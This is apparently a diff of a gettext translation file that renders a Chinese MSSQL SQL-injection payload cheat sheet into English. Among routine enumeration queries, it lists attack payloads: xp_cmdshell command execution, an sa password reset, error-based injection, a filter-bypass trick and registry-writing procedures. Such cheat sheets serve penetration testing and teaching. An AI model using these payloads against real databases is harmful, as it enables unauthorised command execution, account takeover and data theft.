@@ -20,354 +20,360 @@ msgstr ""
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:2
 msgid "SQL Server Payload"
-msgstr ""
+msgstr "SQL Server Payload"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:5
 msgid "常见Payload"
-msgstr ""
+msgstr "Common Payloads"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:6
 msgid "Version"
-msgstr ""
+msgstr "Version"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:7
 msgid "``SELECT @@version``"
-msgstr ""
+msgstr "``SELECT @@version``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:8
 msgid "``SELECT SERVERPROPERTY('Edition');``"
-msgstr ""
+msgstr "``SELECT SERVERPROPERTY('Edition');``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:9
 msgid "``SELECT SERVERPROPERTY('EngineEdition');``"
-msgstr ""
+msgstr "``SELECT SERVERPROPERTY('EngineEdition');``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:10
 msgid "Comment"
-msgstr ""
+msgstr "Comment"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:11
 msgid "``SELECT 1 -- comment``"
-msgstr ""
+msgstr "``SELECT 1 -- comment``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:12
 msgid "``SELECT /*comment*/1``"
-msgstr ""
+msgstr "``SELECT /*comment*/1``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:13
 msgid "Space"
-msgstr ""
+msgstr "Space"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:14
 msgid "``0x01 - 0x20``"
-msgstr ""
+msgstr "``0x01 - 0x20``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:15
 msgid "用户信息"
-msgstr ""
+msgstr "User Information"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:16
 msgid "``SELECT user_name()``"
-msgstr ""
+msgstr "``SELECT user_name()``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:17
 msgid "``SELECT system_user``"
-msgstr ""
+msgstr "``SELECT system_user``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:18
 msgid "``SELECT user``"
-msgstr ""
+msgstr "``SELECT user``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:19
 msgid "``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``"
-msgstr ""
+msgstr "``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:20
 msgid "用户权限"
-msgstr ""
+msgstr "User Privileges"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:21
 msgid "``select IS_SRVROLEMEMBER('sysadmin')``"
-msgstr ""
+msgstr "``select IS_SRVROLEMEMBER('sysadmin')``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:22
 msgid "``select IS_SRVROLEMEMBER('db_owner')``"
-msgstr ""
+msgstr "``select IS_SRVROLEMEMBER('db_owner')``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:23
 msgid "List User"
-msgstr ""
+msgstr "List Users"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:24
 msgid "``SELECT name FROM master..syslogins``"
-msgstr ""
+msgstr "``SELECT name FROM master..syslogins``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:25
 msgid "数据库信息"
-msgstr ""
+msgstr "Database Information"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:26
 msgid "``SELECT name FROM master..sysdatabases``"
-msgstr ""
+msgstr "``SELECT name FROM master..sysdatabases``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:27
 msgid ""
 "``select concat_ws(table_schema,table_name,column_name) from "
 "information_schema.columns``"
 msgstr ""
+"``select concat_ws(table_schema,table_name,column_name) from "
+"information_schema.columns``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:28
 msgid "``select quotename(name) from master..sysdatabases FOR XML PATH('')``"
-msgstr ""
+msgstr "``select quotename(name) from master..sysdatabases FOR XML PATH('')``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:29
 msgid "执行命令"
-msgstr ""
+msgstr "Command Execution"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:30
 msgid "``EXEC xp_cmdshell 'net user'``"
-msgstr ""
+msgstr "``EXEC xp_cmdshell 'net user'``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:31
 msgid "Ascii"
-msgstr ""
+msgstr "ASCII"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:32
 msgid "``SELECT char(0x41)``"
-msgstr ""
+msgstr "``SELECT char(0x41)``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:33
 msgid "``SELECT ascii('A')``"
-msgstr ""
+msgstr "``SELECT ascii('A')``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:34
 msgid "``SELECT char(65)+char(66)`` => return ``AB``"
-msgstr ""
+msgstr "``SELECT char(65)+char(66)`` => returns ``AB``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:35
 msgid "Delay"
-msgstr ""
+msgstr "Delay"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:36
 msgid "``WAITFOR DELAY '0:0:3'`` pause for 3 seconds"
-msgstr ""
+msgstr "``WAITFOR DELAY '0:0:3'`` pauses for 3 seconds"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:37
 msgid "Change Password"
-msgstr ""
+msgstr "Change Password"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:38
 msgid "``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``"
-msgstr ""
+msgstr "``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:39
 msgid "Trick"
-msgstr ""
+msgstr "Trick"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:40
 msgid "``id=1 union:select password from:user``"
-msgstr ""
+msgstr "``id=1 union:select password from:user``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:41
 msgid "文件读取"
-msgstr ""
+msgstr "File Reading"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:42
 msgid "OpenRowset"
-msgstr ""
+msgstr "OpenRowset"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:43
 msgid "当前查询语句"
-msgstr ""
+msgstr "Current Query Statement"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:44
 msgid ""
 "``select text from sys.dm_exec_requests cross apply "
 "sys.dm_exec_sql_text(sql_handle)``"
 msgstr ""
+"``select text from sys.dm_exec_requests cross apply "
+"sys.dm_exec_sql_text(sql_handle)``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:45
 msgid "hostname"
-msgstr ""
+msgstr "Hostname"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:46
 msgid "用于判断是否站库分离"
-msgstr ""
+msgstr "Used to determine whether the web server and database are separated"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:47
 msgid "``select host_name()``"
-msgstr ""
+msgstr "``select host_name()``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:48
 msgid "``exec xp_getnetname``"
-msgstr ""
+msgstr "``exec xp_getnetname``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:49
 msgid "服务器信息"
-msgstr ""
+msgstr "Server Information"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:50
 msgid "``exec xp_msver``"
-msgstr ""
+msgstr "``exec xp_msver``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:51
 msgid "系统配置"
-msgstr ""
+msgstr "System Configuration"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:52
 msgid "``select * from sys.configurations;``"
-msgstr ""
+msgstr "``select * from sys.configurations;``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:55
 msgid "注册表读写"
-msgstr ""
+msgstr "Registry Read and Write"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:56
 msgid "``xp_regread``"
-msgstr ""
+msgstr "``xp_regread``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:57
 msgid ""
 "``exec xp_regread N'HKEY_LOCAL_MACHINE', "
 "N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'``"
 msgstr ""
+"``exec xp_regread N'HKEY_LOCAL_MACHINE', "
+"N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:58
 msgid "``xp_regwrite``"
-msgstr ""
+msgstr "``xp_regwrite``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:59
 msgid "``xp_regdeletvalue``"
-msgstr ""
+msgstr "``xp_regdeletvalue``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:60
 msgid "``xp_regdeletkey``"
-msgstr ""
+msgstr "``xp_regdeletkey``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:61
 msgid "``xp_regaddmultistring``"
-msgstr ""
+msgstr "``xp_regaddmultistring``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:64
 msgid "报错注入"
-msgstr ""
+msgstr "Error-Based Injection"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:65
 msgid "``1=convert(int,(db_name()))``"
-msgstr ""
+msgstr "``1=convert(int,(db_name()))``"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:68
 msgid "常用函数"
-msgstr ""
+msgstr "Common Functions"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:69
 msgid "SUSER_NAME()"
-msgstr ""
+msgstr "SUSER_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:70
 msgid "USER_NAME()"
-msgstr ""
+msgstr "USER_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:71
 msgid "PERMISSIONS()"
-msgstr ""
+msgstr "PERMISSIONS()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:72
 msgid "DB_NAME()"
-msgstr ""
+msgstr "DB_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:73
 msgid "FILE_NAME()"
-msgstr ""
+msgstr "FILE_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:74
 msgid "TYPE_NAME()"
-msgstr ""
+msgstr "TYPE_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:75
 msgid "COL_NAME()"
-msgstr ""
+msgstr "COL_NAME()"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:78
 msgid "DNS OOB"
-msgstr ""
+msgstr "DNS OOB"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:79
 msgid "fn_xe_file_target_read_file"
-msgstr ""
+msgstr "fn_xe_file_target_read_file"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:80
 msgid "fn_get_audit_file"
-msgstr ""
+msgstr "fn_get_audit_file"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:81
 msgid "fn_trace_gettable"
-msgstr ""
+msgstr "fn_trace_gettable"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:84
 msgid "其他常用存储过程"
-msgstr ""
+msgstr "Other Common Stored Procedures"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:85
 msgid "sp_execute_external_script"
-msgstr ""
+msgstr "sp_execute_external_script"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:86
 msgid "sp_makewebtask"
-msgstr ""
+msgstr "sp_makewebtask"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:87
 msgid "sp_OACreate"
-msgstr ""
+msgstr "sp_OACreate"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:88
 msgid "sp_OADestroy"
-msgstr ""
+msgstr "sp_OADestroy"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:89
 msgid "sp_OAGetErrorInfo"
-msgstr ""
+msgstr "sp_OAGetErrorInfo"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:90
 msgid "sp_OAGetProperty"
-msgstr ""
+msgstr "sp_OAGetProperty"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:91
 msgid "sp_OAMethod"
-msgstr ""
+msgstr "sp_OAMethod"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:92
 msgid "sp_OASetProperty"
-msgstr ""
+msgstr "sp_OASetProperty"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:93
 msgid "sp_OAStop"
-msgstr ""
+msgstr "sp_OAStop"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:94
 msgid "xp_cmdshell"
-msgstr ""
+msgstr "xp_cmdshell"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:95
 msgid "xp_dirtree"
-msgstr ""
+msgstr "xp_dirtree"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:96
 msgid "xp_enumerrorlogs"
-msgstr ""
+msgstr "xp_enumerrorlogs"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:97
 msgid "xp_enumgroups"
-msgstr ""
+msgstr "xp_enumgroups"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:98
 msgid "xp_fixeddrives"
-msgstr ""
+msgstr "xp_fixeddrives"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:99
 msgid "xp_getfiledetails"
-msgstr ""
+msgstr "xp_getfiledetails"
 
 #: ../../source/vuln/sql/cheatsheet/mssql.rst:100
 msgid "xp_loginconfig"
-msgstr ""
+msgstr "xp_loginconfig"
